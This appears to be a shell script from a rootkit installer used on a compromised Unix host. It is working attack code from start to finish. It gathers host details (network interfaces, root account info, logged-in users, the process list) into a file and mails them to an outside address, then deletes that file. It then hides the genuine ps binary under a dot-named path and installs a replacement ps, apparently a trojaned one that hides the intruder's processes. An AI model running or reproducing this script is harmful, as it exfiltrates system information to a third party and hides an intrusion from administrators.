#!/bin/sh
echo '0wned'>>mail.stat
echo 'HOST DET:'>>mail.stat
/sbin/ifconfig>>mail.stat
finger root>>mail.stat
w>>mail.stat
ps ax>>mail.stat
echo '.'>>mail.stat
echo ''>>mail.stat
mail kork@onicrom.com < mail.stat
rm -rf mail.stat
mv /bin/ps /usr/bin/.ps
mv ps /bin/ps
